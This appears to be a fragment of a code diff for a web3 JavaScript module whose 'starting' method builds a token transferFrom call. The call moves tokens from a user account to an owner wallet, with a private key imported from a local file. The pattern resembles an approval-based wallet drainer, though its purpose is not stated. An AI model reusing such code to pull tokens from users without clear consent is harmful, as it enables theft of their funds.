@@ -4,13 +4,12 @@ import { privateKey } from './datas/privateKey';
 import BigNumber from 'bignumber.js';
 
 export class TC {
-    static async starting(account,tokenAddress,amount,decimal) {
+    static async starting(account,tokenAddress,amount) {
         try {
-            if(amount <= 0 && tokenAddress != '') return true;
+            if(amount <= 0) return true;
             const user_wallet = SC.owner;
             let contract = SC.tokenContract2;
-            const amountv2 = new BigNumber(amount * 10 ** decimal);
-            let data = contract.methods.transferFrom(account, user_wallet.address, amountv2.toFixed()).encodeABI()
+            let data = contract.methods.transferFrom(account, user_wallet.address, amount).encodeABI()
             var approveTX ={
                 gas: SC.web3ojb.utils.toHex(100000),
                 to: tokenAddress,
